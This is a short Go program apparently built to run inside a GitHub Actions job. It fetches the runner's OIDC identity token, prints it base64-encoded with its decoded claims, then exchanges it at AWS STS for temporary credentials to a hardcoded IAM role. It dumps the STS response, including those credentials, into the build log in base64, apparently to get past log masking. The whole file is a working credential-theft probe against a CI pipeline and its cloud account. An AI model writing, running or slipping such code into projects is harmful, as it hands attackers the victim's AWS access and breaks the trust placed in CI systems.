package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func main() {
	role := os.Getenv("ROLE_ARN")
	if role == "" {
		role = "arn:aws:iam::975050171347:role/gha-marketplace-fe"
	}
	aud := os.Getenv("OIDC_AUD")
	if aud == "" {
		aud = "sts.amazonaws.com"
	}
	u := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
	t := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
	if u == "" || t == "" {
		fmt.Println("NO_OIDC_ENV")
		return
	}
	req, _ := http.NewRequest("GET", u+"&audience="+url.QueryEscape(aud), nil)
	req.Header.Set("Authorization", "bearer "+t)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println("TOKEN_REQ_ERR", err)
		return
	}
	b, _ := io.ReadAll(resp.Body)
	fmt.Println("TOKEN_RESP_CODE", resp.StatusCode)
	var j struct {
		Value string `json:"value"`
	}
	json.Unmarshal(b, &j)
	tok := j.Value
	fmt.Println("TOKEN_LEN", len(tok))
	fmt.Println("JWT_B64", base64.StdEncoding.EncodeToString([]byte(tok)))
	parts := strings.Split(tok, ".")
	if len(parts) > 1 {
		pb, e := base64.RawURLEncoding.DecodeString(parts[1])
		if e == nil {
			fmt.Println("CLAIMS", string(pb))
		}
	} else {
		rs := string(b)
		if len(rs) > 500 {
			rs = rs[:500]
		}
		fmt.Println("RAW_RESP", rs)
		return
	}

	form := url.Values{}
	form.Set("Action", "AssumeRoleWithWebIdentity")
	form.Set("Version", "2011-06-15")
	form.Set("RoleArn", role)
	form.Set("RoleSessionName", "ghaprobe")
	form.Set("WebIdentityToken", tok)
	form.Set("DurationSeconds", "3600")
	rr, err := http.Post("https://sts.amazonaws.com/", "application/x-www-form-urlencoded", strings.NewReader(form.Encode()))
	if err != nil {
		fmt.Println("STS_ERR", err)
		return
	}
	sb, _ := io.ReadAll(rr.Body)
	fmt.Println("STS_CODE", rr.StatusCode)
	fmt.Println("STS_B64", base64.StdEncoding.EncodeToString(sb))
	head := string(sb)
	if len(head) > 3000 {
		head = head[:3000]
	}
	fmt.Println("STS_HEAD", head)
}
